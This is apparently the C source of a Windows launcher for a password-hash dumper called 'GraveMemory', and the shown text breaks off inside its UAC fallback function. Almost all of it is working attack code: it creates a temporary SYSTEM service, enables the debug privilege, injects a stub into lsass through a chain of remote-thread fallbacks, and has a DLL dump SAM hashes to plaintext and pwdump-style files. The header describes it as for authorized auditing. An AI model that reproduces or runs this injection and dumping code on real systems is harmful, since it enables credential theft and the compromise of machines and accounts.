/*
 * gravememory.c - GraveMemory launcher: UAC elevation, temporary SYSTEM
 *                 service and lsass injection. A from-scratch rewrite of
 *                 the classic remote-agent SAM hash dumper design,
 *                 WITHOUT the output-encryption layer.
 *
 * Faithful implementation of the classic two-stage pipeline (verified
 * against the public reference sources):
 *
 *   gravememory.exe (SYSTEM service)
 *            -> SetAccessPriv (SeDebugPrivilege)
 *            -> OpenProcess(lsass, PROCESS_ALL_ACCESS)
 *            -> VirtualAllocEx + WriteProcessMemory(InjectThread + data)
 *            -> CreateRemoteThread (fallbacks: RtlCreateUserThread,
 *               NtCreateThreadEx)
 *          gravememorydll*.dll loaded INSIDE lsass
 *            -> DumpHashes(folder) -> samsrv.dll SAMR (SamIConnect...)
 *            -> PLAINTEXT record stream -> gravememory.dmp
 *
 * Why injection is NOT optional (v1.0 lesson): the local SAM database
 * lives inside lsass and only releases OWF password hashes to its host
 * process. Calling samsrv.dll from a plain SYSTEM service fails - this
 * is exactly why GraveMemory injects into lsass.
 *
 * What was REMOVED on purpose (per user request):
 *   - RSA public-key patching into the DLL (the legacy key-seal
 *     machinery)
 *   - OpenSSL EVP_Seal container (no crypto at all - zero libraries)
 *   - anti-debug loop
 *
 * What was KEPT byte-identical:
 *   - the record stream format (see gravememory_record.h) so that the
 *     format stays stable across versions and gm_dump_parser.py can
 *     consume it
 *   - the 12-byte status file layout  [total][processed][finished]
 *   - output-file ACL: SYSTEM=full, Administrators=read|delete
 *   - the injection chain (CreateRemoteThread -> RtlCreateUserThread ->
 *     NtCreateThreadEx)
 *
 * Outputs (in --out folder):
 *   gravememory.dmp          plaintext record stream
 *   gravememory.dmp.status   12-byte status ([total][processed][finished])
 *   gravememory.dmp.result   one ANSI line result (launcher <-> dll protocol)
 *   gravememory.dmp.log      step-by-step diagnostic log
 *   gravememory.json         friendly JSON report
 *   hashes.txt              pwdump-style lines (user:RID:LM:NT:::)
 *
 * AUTHORIZED USE ONLY. For auditing machines you own or are explicitly
 * authorized to assess. Handle dumped password material accordingly.
 *
 * Build (MSVC):    build\build-msvc.bat
 * Build (mingw):   bash build/build-mingw.sh
 */

#define _WIN32_WINNT 0x0501

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#include "gravememory_shared.h"

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#endif

/* ================================================================== */
/* ntdll thread-creation fallbacks                                    */
/* ================================================================== */

typedef NTSTATUS (WINAPI *PRtlCreateUserThread)(
        HANDLE, PSECURITY_DESCRIPTOR, char, ULONG, SIZE_T, SIZE_T,
        PTHREAD_START_ROUTINE, PVOID, PHANDLE, void *);

typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx)(
        OUT PHANDLE hThread,
        IN ACCESS_MASK DesiredAccess,
        IN LPVOID ObjectAttributes,
        IN HANDLE ProcessHandle,
        IN LPTHREAD_START_ROUTINE lpStartAddress,
        IN LPVOID lpParameter,
        IN BOOL CreateSuspended,
        IN ULONG StackZeroBits,
        IN ULONG SizeOfStackCommit,
        IN ULONG SizeOfStackReserve,
        OUT LPVOID lpBytesBuffer);

struct NtCreateThreadExBuffer
{
    ULONG Size;
    ULONG Unknown1;
    ULONG Unknown2;
    PULONG Unknown3;
    ULONG Unknown4;
    ULONG Unknown5;
    ULONG Unknown6;
    PULONG Unknown7;
    ULONG Unknown8;
};

/* ================================================================== */
/* globals                                                            */
/* ================================================================== */

static wchar_t g_selfExe[MAX_PATH + 1] = L"";
static wchar_t g_logPath[MAX_PATH + 1] = L"";
static int g_serviceMode = 0;
static wchar_t g_svcOutDir[MAX_PATH + 1] = L"";
static wchar_t g_svcName[128] = L"";
static SERVICE_STATUS g_svcStatus;
static SERVICE_STATUS_HANDLE g_svcStatusHandle = NULL;
static int g_waitSeconds = 300;

static void SvcLog(const char *fmt, ...)
{
    char line[1024];
    va_list ap;
    if (!g_logPath[0])
        return;
    va_start(ap, fmt);
    _vsnprintf(line, sizeof(line) - 1, fmt, ap);
    va_end(ap);
    line[sizeof(line) - 1] = 0;
    GM_LogFmt(g_logPath, "%s", line);
}

/* console output (suppressed in service mode) + always to the log */
static void EOut(const char *fmt, ...)
{
    char line[1024];
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf(line, sizeof(line) - 1, fmt, ap);
    va_end(ap);
    line[sizeof(line) - 1] = 0;
    if (!g_serviceMode)
        printf("%s\n", line);
    SvcLog("%s", line);
}

/* ================================================================== */
/* the remote stub - copied verbatim into lsass and executed there.   */
/* It must reference NO imports and NO globals: everything comes from  */
/* the GM_REMOTE_ARGS block placed right after the stub body.         */
/* ================================================================== */

/* MSVC cannot use __attribute__; use #pragma code_seg for the stub region.
 * (stub bytes are COPIED into lsass and executed there - the local section
 * flags are irrelevant, only adjacency of the two functions matters) */
#if defined(_MSC_VER)
#pragma code_seg(".rstub")
#define GM_STUB_ATTR __declspec(noinline)
#else
#define GM_STUB_ATTR __attribute__((section(".rstub"), used, noinline))
#endif

GM_STUB_ATTR static DWORD WINAPI RemoteStub(LPVOID param)
{
    GM_REMOTE_ARGS *a = (GM_REMOTE_ARGS *)param;
    HMODULE h;
    void (*pDump)(const wchar_t *);

    if (!a || !a->pLoadLibraryW || !a->pGetProcAddress)
        return GM_STUB_BADARGS;
    h = a->pLoadLibraryW(a->dllPath);
    if (!h)
        return GM_STUB_LOADFAIL;
    pDump = (void (*)(const wchar_t *))a->pGetProcAddress(h, a->exportName);
    if (!pDump) {
        if (a->pFreeLibrary)
            a->pFreeLibrary(h);
        return GM_STUB_GETPROCFAIL;
    }
    pDump(a->dumpFolder);
    if (a->pFreeLibrary)
        a->pFreeLibrary(h);
    return GM_STUB_OK;
}

/* end marker used to measure the stub size (same section => adjacent) */
GM_STUB_ATTR static void RemoteStubEnd(void) { }

#if defined(_MSC_VER)
#pragma code_seg()
#endif

/* ================================================================== */
/* SYSTEM helpers                                                     */
/* ================================================================== */

static BOOL EnableDebugPriv(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES priv;
    BOOL ok = FALSE;

    if (OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME,
                                  &priv.Privileges[0].Luid)) {
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            priv.PrivilegeCount = 1;
            if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
                ok = (GetLastError() == ERROR_SUCCESS);
        }
        CloseHandle(hToken);
    }
    return ok;
}

static HANDLE GetLsassHandle(DWORD *pidOut, DWORD *errOut)
{
    PROCESSENTRY32W uProcess;
    HANDLE lSnapshot;
    HANDLE hProcess = NULL;
    DWORD pid = 0;
    DWORD err = 0;

    lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (lSnapshot == INVALID_HANDLE_VALUE) {
        if (errOut)
            *errOut = GetLastError();
        return NULL;
    }
    uProcess.dwSize = sizeof(uProcess);
    if (Process32FirstW(lSnapshot, &uProcess)) {
        do {
            if (wcscmp(uProcess.szExeFile, L"lsass.exe") == 0) {
                pid = uProcess.th32ProcessID;
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (!hProcess) {
                    err = GetLastError();
                    /* try the minimal rights the injection needs */
                    hProcess = OpenProcess(
                        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |
                        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                        PROCESS_VM_READ, FALSE, pid);
                    if (!hProcess)
                        err = GetLastError();
                }
                break;
            }
        } while (Process32NextW(lSnapshot, &uProcess));
    }
    CloseHandle(lSnapshot);

    if (pidOut)
        *pidOut = pid;
    if (errOut)
        *errOut = err;
    return hProcess;
}

/* remote thread creation fallback chain: CreateRemoteThread ->
 * RtlCreateUserThread (Vista+ "insufficient privs" quirk) ->
 * NtCreateThreadEx */
static HANDLE CreateRemoteThreadGM(HANDLE hProcess, LPVOID startAddr,
                                    LPVOID param)
{
    HANDLE hThread = NULL;
    DWORD err;

    SetLastError(0);
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)startAddr, param,
                                 CREATE_SUSPENDED, NULL);
    err = GetLastError();

    if (!hThread && err == ERROR_NOT_ENOUGH_MEMORY) {
        PRtlCreateUserThread pRtlCreateUserThread = (PRtlCreateUserThread)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                           "RtlCreateUserThread");
        if (pRtlCreateUserThread) {
            NTSTATUS st = pRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0,
                                               (PTHREAD_START_ROUTINE)startAddr,
                                               param, &hThread, NULL);
            SetLastError((DWORD)st);
            err = (DWORD)st;
        }
    }

    if (!hThread) {
        LPFUN_NtCreateThreadEx pNtCreateThreadEx = (LPFUN_NtCreateThreadEx)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
        if (pNtCreateThreadEx) {
            struct NtCreateThreadExBuffer ntbuffer;
            DWORD temp1 = 0, temp2 = 0;
            NTSTATUS st;

            memset(&ntbuffer, 0, sizeof(ntbuffer));
            ntbuffer.Size = sizeof(ntbuffer);
            ntbuffer.Unknown1 = 0x10003;
            ntbuffer.Unknown2 = 0x8;
            ntbuffer.Unknown3 = &temp2;
            ntbuffer.Unknown4 = 0;
            ntbuffer.Unknown5 = 0x10004;
            ntbuffer.Unknown6 = 4;
            ntbuffer.Unknown7 = &temp1;
            ntbuffer.Unknown8 = 0;

            st = pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess,
                                   (LPTHREAD_START_ROUTINE)startAddr, param,
                                   FALSE, 0, 0, 0, &ntbuffer);
            SetLastError((DWORD)st);
            err = (DWORD)st;
        }
    }

    (void)err;
    if (hThread)
        ResumeThread(hThread);
    return hThread;
}

/* ================================================================== */
/* small file helpers                                                 */
/* ================================================================== */

static void EnsureOutDir(const wchar_t *dir)
{
    wchar_t clean[MAX_PATH + 1];
    size_t l;

    _snwprintf(clean, MAX_PATH, L"%s", dir);
    clean[MAX_PATH] = 0;
    l = wcslen(clean);
    while (l > 3 && clean[l - 1] == L'\\') {
        clean[l - 1] = 0;
        l--;
    }
    if (!CreateDirectoryW(clean, NULL)) {
        /* ALREADY_EXISTS is fine; anything else gets caught later */
    }
}

static BOOL ReadAnsiFileTry(const wchar_t *path, char *buf, DWORD cap,
                            DWORD *outLen)
{
    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD rd = 0;
    BOOL ok;

    if (h == INVALID_HANDLE_VALUE)
        return FALSE;
    ok = ReadFile(h, buf, cap - 1, &rd, NULL);
    CloseHandle(h);
    if (!ok)
        return FALSE;
    if (outLen)
        *outLen = rd;
    buf[rd] = 0;
    return TRUE;
}

static void CatFile(const wchar_t *path)
{
    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    char buf[16384];
    DWORD rd = 0;

    if (h == INVALID_HANDLE_VALUE)
        return;
    while (ReadFile(h, buf, sizeof(buf) - 1, &rd, NULL) && rd > 0) {
        buf[rd] = 0;
        fputs(buf, stdout);
    }
    CloseHandle(h);
}

/* print the tail of the diagnostic log (last ~40 lines) */
static void PrintTail(const wchar_t *path)
{
    static char big[65536];
    DWORD rd = 0;
    int i, lines = 0, lastnl[41];
    int nlcount = 0;

    if (!ReadAnsiFileTry(path, big, sizeof(big) - 1, &rd) || rd == 0)
        return;
    big[rd] = 0;

    for (i = (int)rd - 1; i >= 0 && nlcount < 41; i--) {
        if (big[i] == '\n') {
            lastnl[nlcount++] = i;
        }
    }
    if (nlcount == 0)
        return;
    lines = lastnl[nlcount - 1] + 1; /* start of the 40th line from the end */
    if (lines >= (int)rd)
        return;
    printf("---- %ls (tail) ----\n", path);
    fputs(&big[lines], stdout);
}

/* poll for the ANSI result file; 0=OK, 1=FAIL, 3=timeout.
 * NOTE: every service failure path writes a result file BEFORE the
 * service stops, so the hSvc STOPPED check below is authoritative and
 * there is no create-then-write race to worry about. */
static int WaitForResultFile(const wchar_t *outdir, char *resultBuf,
                             DWORD resultCap, SC_HANDLE hSvc)
{
    DWORD elapsed = 0;
    SERVICE_STATUS ss;
    wchar_t resPath[MAX_PATH + 1];

    GM_JoinPath(outdir, GM_RESULT_NAME, resPath, MAX_PATH + 1);
    resultBuf[0] = 0;

    while (elapsed < (DWORD)g_waitSeconds * 1000) {
        DWORD rd = 0;
        if (ReadAnsiFileTry(resPath, resultBuf, resultCap, &rd) && rd > 0) {
            return (strncmp(resultBuf, "OK", 2) == 0) ? 0 : 1;
        }
        if (hSvc) {
            if (QueryServiceStatus(hSvc, &ss) &&
                ss.dwCurrentState == SERVICE_STOPPED) {
                /* give the file a moment, then give up */
                Sleep(1500);
                if (ReadAnsiFileTry(resPath, resultBuf, resultCap, &rd) &&
                    rd > 0)
                    return (strncmp(resultBuf, "OK", 2) == 0) ? 0 : 1;
                resultBuf[0] = 0;
                return 1;
            }
        }
        Sleep(500);
        elapsed += 500;
    }
    resultBuf[0] = 0;
    return 3;
}

/* ================================================================== */
/* SYSTEM-context dump: inject the dll into lsass and wait            */
/* ================================================================== */

static int RunElevatedDump(const wchar_t *outdir)
{
    wchar_t dllPath[MAX_PATH + 1];
    wchar_t resPath[MAX_PATH + 1];
    wchar_t logPath[MAX_PATH + 1];
    wchar_t txtPath[MAX_PATH + 1];
    wchar_t exeDir[MAX_PATH + 1];
    wchar_t *slash;
    GM_REMOTE_ARGS args;
    HMODULE hKernel;
    DWORD lsassPid = 0, openErr = 0, exitCode = 0;
    HANDLE hLsass = NULL, hThread = NULL;
    size_t stubSize;
    SIZE_T nSizeWritten = 0;
    void *remoteBase = NULL;
    char resBuf[256];
    char resultLine[256];
    int rc = 1;
    BOOL haveResult = FALSE;
    BOOL threadFinished = FALSE;

    dllPath[0] = resPath[0] = logPath[0] = txtPath[0] = exeDir[0] = 0;
    memset(&args, 0, sizeof(args));
    resultLine[0] = 0;

    EnsureOutDir(outdir);
    GM_JoinPath(outdir, GM_LOG_NAME, logPath, MAX_PATH + 1);
    GM_JoinPath(outdir, GM_RESULT_NAME, resPath, MAX_PATH + 1);
    GM_JoinPath(outdir, GM_TXT_NAME, txtPath, MAX_PATH + 1);
    _snwprintf(g_logPath, MAX_PATH, L"%s", logPath);
    g_logPath[MAX_PATH] = 0;

    SvcLog("=== gravememory elevated run start (pid=%lu) ===",
           (unsigned long)GetCurrentProcessId());
    EOut("[*] injecting dump DLL into lsass (SYSTEM context)...");

    /* DLL sits next to this exe (like the dump DLL next to its
     * launcher exe) */
    _snwprintf(exeDir, MAX_PATH, L"%s", g_selfExe);
    exeDir[MAX_PATH] = 0;
    slash = wcsrchr(exeDir, L'\\');
    if (slash)
        *slash = 0;
    else
        _snwprintf(exeDir, MAX_PATH, L".");
    exeDir[MAX_PATH] = 0;
    GM_JoinPath(exeDir, GM_DLL_NAME, dllPath, MAX_PATH + 1);

    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL dump dll not found: %ls", dllPath);
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        EOut("    place %ls next to the exe and retry", GM_DLL_NAME);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    {
        char dllU8[MAX_PATH * 2];
        WideCharToMultiByte(CP_UTF8, 0, dllPath, -1, dllU8,
                            (int)sizeof(dllU8) - 1, NULL, NULL);
        dllU8[sizeof(dllU8) - 1] = 0;
        SvcLog("dll=%s", dllU8);
    }

    if (!EnableDebugPriv())
        SvcLog("WARNING: SeDebugPrivilege not enabled err=%lu",
               (unsigned long)GetLastError());
    else
        SvcLog("SeDebugPrivilege enabled");

    /* ---- open lsass ---- */
    hLsass = GetLsassHandle(&lsassPid, &openErr);
    if (!hLsass) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL OpenProcess(lsass) err=%lu (RunAsPPL/EDR blocks it?)",
                  (unsigned long)openErr);
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    SvcLog("lsass pid=%lu opened", (unsigned long)lsassPid);

    /* ---- build the argument block ---- */
    hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL kernel32 handle");
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    args.pLoadLibraryW = (GM_LOADLIBRARYW_T)GetProcAddress(hKernel,
                                                            "LoadLibraryW");
    args.pGetProcAddress = (GM_GETPROCADDRESS_T)GetProcAddress(hKernel,
                                                                "GetProcAddress");
    args.pFreeLibrary = (GM_FREELIBRARY_T)GetProcAddress(hKernel,
                                                          "FreeLibrary");
    if (!args.pLoadLibraryW || !args.pGetProcAddress || !args.pFreeLibrary) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL resolve kernel32 exports err=%lu",
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    _snwprintf(args.dllPath, MAX_PATH, L"%s", dllPath);
    args.dllPath[MAX_PATH] = 0;
    _snwprintf(args.dumpFolder, MAX_PATH, L"%s", outdir);
    args.dumpFolder[MAX_PATH] = 0;
    _snprintf(args.exportName, sizeof(args.exportName) - 1, "%s",
              GM_EXPORT_NAME);
    args.exportName[sizeof(args.exportName) - 1] = 0;

    /* ---- measure + inject the stub ---- */
    stubSize = (size_t)&RemoteStubEnd - (size_t)&RemoteStub;
    if (stubSize == 0 || stubSize > 0x4000) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL internal stub layout broken (size=%u)",
                  (unsigned)stubSize);
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    SvcLog("stub size=%u bytes", (unsigned)stubSize);

    remoteBase = VirtualAllocEx(hLsass, NULL, stubSize + sizeof(args),
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL VirtualAllocEx(lsass) err=%lu",
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }

    if (!WriteProcessMemory(hLsass, remoteBase, (LPCVOID)&RemoteStub,
                            stubSize, &nSizeWritten) ||
        nSizeWritten != stubSize) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL WriteProcessMemory(stub) err=%lu",
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        goto done;
    }
    if (!WriteProcessMemory(hLsass, (BYTE *)remoteBase + stubSize, &args,
                            sizeof(args), &nSizeWritten) ||
        nSizeWritten != sizeof(args)) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL WriteProcessMemory(args) err=%lu",
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        goto done;
    }
    SvcLog("stub+args written to lsass @%p", remoteBase);

    /* ---- create the remote thread (GraveMemory fallback chain) ---- */
    hThread = CreateRemoteThreadGM(hLsass, remoteBase,
                                    (BYTE *)remoteBase + stubSize);
    if (!hThread) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL CreateRemoteThread err=%lu (RunAsPPL/EDR blocks it?)",
                  (unsigned long)GetLastError());
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    SvcLog("remote thread created, waiting (max %d s)...", g_waitSeconds);

    if (WaitForSingleObject(hThread, (DWORD)g_waitSeconds * 1000) !=
        WAIT_OBJECT_0) {
        _snprintf(resultLine, sizeof(resultLine) - 1,
                  "FAIL timeout waiting for dump thread (%d s)", g_waitSeconds);
        resultLine[sizeof(resultLine) - 1] = 0;
        EOut("[-] ERROR: %s", resultLine);
        GM_WriteAnsiPlain(resPath, resultLine);
        goto done;
    }
    GetExitCodeThread(hThread, &exitCode);
    threadFinished = (exitCode != STILL_ACTIVE);
    SvcLog("remote thread exit=0x%08lx", (unsigned long)exitCode);

    /* ---- collect the result written by the dll ---- */
    haveResult = ReadAnsiFileTry(resPath, resBuf, sizeof(resBuf) - 1, NULL);
    if (haveResult && resBuf[0]) {
        _snprintf(resultLine, sizeof(resultLine) - 1, "%s", resBuf);
        resultLine[sizeof(resultLine) - 1] = 0;
    } else {
        switch (exitCode) {
        case GM_STUB_LOADFAIL:
            _snprintf(resultLine, sizeof(resultLine) - 1,
                      "FAIL LoadLibraryW failed inside lsass (dll blocked or "
                      "path invalid)");
            break;
        case GM_STUB_GETPROCFAIL:
            _snprintf(resultLine, sizeof(resultLine) - 1,
                      "FAIL GetProcAddress(%s) failed inside lsass",
                      GM_EXPORT_NAME);
            break;
        case GM_STUB_BADARGS:
            _snprintf(resultLine, sizeof(resultLine) - 1,
                      "FAIL stub received bad args");
            break;
        default:
            _snprintf(resultLine, sizeof(resultLine) - 1,
                      "FAIL dump thread exit=0x%08lx",
                      (unsigned long)exitCode);
            break;
        }
        resultLine[sizeof(resultLine) - 1] = 0;
        GM_WriteAnsiPlain(resPath, resultLine);
    }

    rc = (strncmp(resultLine, "OK", 2) == 0) ? 0 : 1;
    if (rc == 0) {
        EOut("[+] dump complete: %s", resultLine);
    } else {
        EOut("[-] ERROR: %s", resultLine);
    }

done:
    if (hThread)
        CloseHandle(hThread);
    /* only free the remote memory once the remote thread is really done;
     * freeing while it still executes would fault lsass */
    if (remoteBase && hLsass && threadFinished)
        VirtualFreeEx(hLsass, remoteBase, 0, MEM_RELEASE);
    else if (remoteBase && hLsass)
        SvcLog("remote memory kept (thread still active) - freed at reboot");
    if (hLsass)
        CloseHandle(hLsass);
    if (rc == 0 && !g_serviceMode)
        CatFile(txtPath);
    SvcLog("=== gravememory elevated run end rc=%d ===", rc);
    return rc;
}

/* ================================================================== */
/* privilege checks                                                   */
/* ================================================================== */

static BOOL IsLocalSystem(void)
{
    HANDLE hToken = NULL;
    DWORD len = 0;
    PTOKEN_USER tu = NULL;
    PSID sysSid = NULL;
    SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
    BOOL result = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return FALSE;
    }
    tu = (PTOKEN_USER)malloc(len);
    if (!tu || !GetTokenInformation(hToken, TokenUser, tu, len, &len))
        goto out;
    if (!AllocateAndInitializeSid(&sia, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0,
                                  0, 0, 0, 0, &sysSid))
        goto out;
    result = EqualSid(tu->User.Sid, sysSid) ? TRUE : FALSE;
out:
    if (sysSid)
        FreeSid(sysSid);
    free(tu);
    CloseHandle(hToken);
    return result;
}

static BOOL IsAdmin(void)
{
    PSID adminSid = NULL;
    SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
    BOOL isMember = FALSE;

    if (!AllocateAndInitializeSid(&sia, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                  &adminSid))
        return FALSE;
    CheckTokenMembership(NULL, adminSid, &isMember);
    FreeSid(adminSid);
    return isMember;
}

/* ================================================================== */
/* SYSTEM elevation via temporary service                             */
/* ================================================================== */

static int ElevateViaService(const wchar_t *selfExe, const wchar_t *outdir)
{
    SC_HANDLE hSCM = NULL, hSvc = NULL;
    wchar_t svcName[128];
    wchar_t cmdLine[MAX_PATH * 2 + 128];
    char resultBuf[256];
    wchar_t logPath[MAX_PATH + 1];
    int rc = 1;
    SERVICE_STATUS ss;

    resultBuf[0] = 0;
    _snwprintf(svcName, 128, L"GraveMemory-%08x",
               (unsigned)((GetTickCount() ^ GetCurrentProcessId()) &
                          0xffffffff));
    svcName[127] = 0;
    _snwprintf(cmdLine, MAX_PATH * 2 + 120, L"\"%s\" --svc \"%s\" --svcname \"%s\"",
               selfExe, outdir, svcName);
    cmdLine[(MAX_PATH * 2 + 120) - 1] = 0;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("ERROR: OpenSCManager failed (run as Administrator) err=%lu\n",
               GetLastError());
        return 2;
    }
    hSvc = CreateServiceW(hSCM, svcName, L"GraveMemory (temporary)",
                          SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                          SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                          cmdLine, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        printf("ERROR: CreateService failed err=%lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return 2;
    }
    if (!StartServiceW(hSvc, 0, NULL)) {
        printf("ERROR: StartService failed err=%lu\n", GetLastError());
        goto cleanup;
    }

    rc = WaitForResultFile(outdir, resultBuf, sizeof(resultBuf), hSvc);
    if (rc == 0) {
        printf("[+] dump complete: %s\n", resultBuf);
    } else if (rc == 1) {
        printf("[-] dump FAILED: %s\n",
               resultBuf[0] ? resultBuf : "(no result file)");
        GM_JoinPath(outdir, GM_LOG_NAME, logPath, MAX_PATH + 1);
        PrintTail(logPath);
    } else {
        printf("[-] timeout waiting for dump (%d seconds)\n", g_waitSeconds);
    }

cleanup:
    if (hSvc) {
        if (QueryServiceStatus(hSvc, &ss) &&
            ss.dwCurrentState != SERVICE_STOPPED) {
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
            Sleep(300);
        }
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
    return rc;
}

/* ================================================================== */
/* service plumbing                                                   */
/* ================================================================== */

static void WINAPI ServiceCtrlHandler(DWORD ctrl)
{
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
        g_svcStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_svcStatus.dwWaitHint = 0;
        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
        break;
    default:
        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
        break;
    }
}

static void WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
{
    (void)argc;
    (void)argv;

    g_svcStatusHandle = RegisterServiceCtrlHandlerW(g_svcName, ServiceCtrlHandler);
    if (!g_svcStatusHandle)
        return;

    g_svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svcStatus.dwServiceSpecificExitCode = 0;
    g_svcStatus.dwWaitHint = 5000;
    g_svcStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);

    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_svcStatus.dwCurrentState = SERVICE_RUNNING;
    g_svcStatus.dwCheckPoint = 0;
    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);

    {
        int rc = RunElevatedDump(g_svcOutDir);
        g_svcStatus.dwCurrentState = SERVICE_STOPPED;
        g_svcStatus.dwWin32ExitCode = (DWORD)rc;
        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
    }
}

static int RunAsService(void)
{
    SERVICE_TABLE_ENTRYW table[2];
    table[0].lpServiceName = g_svcName;
    table[0].lpServiceProc = ServiceMain;
    table[1].lpServiceName = NULL;
    table[1].lpServiceProc = NULL;
    if (!StartServiceCtrlDispatcherW(table)) {
        /* not started by the SCM (wrong name / manual run) - report via file */
        wchar_t resPath[MAX_PATH + 1];
        char msg[128];
        if (g_svcOutDir[0]) {
            wchar_t logPath[MAX_PATH + 1];
            GM_JoinPath(g_svcOutDir, GM_RESULT_NAME, resPath, MAX_PATH + 1);
            _snprintf(msg, sizeof(msg) - 1, "FAIL dispatcher err=%lu",
                      (unsigned long)GetLastError());
            msg[sizeof(msg) - 1] = 0;
            GM_WriteAnsiPlain(resPath, msg);
            GM_JoinPath(g_svcOutDir, GM_LOG_NAME, logPath, MAX_PATH + 1);
            _snwprintf(g_logPath, MAX_PATH, L"%s", logPath);
            g_logPath[MAX_PATH] = 0;
            SvcLog("StartServiceCtrlDispatcher failed err=%lu",
                   (unsigned long)GetLastError());
        }
        return 1;
    }
    return 0;
}

/* ================================================================== */
/* UAC fallback                                                       */
/* ================================================================== */

static int TryUacElevation(const wchar_t *selfExe, const wchar_t *outdir)
{
    SHELLEXECUTEINFOW sei;
    wchar_t params[MAX_PATH * 2 + 64];
    char resultBuf[256];
    wchar_t logPath[MAX_PATH + 1];

    resultBuf[0] = 0;
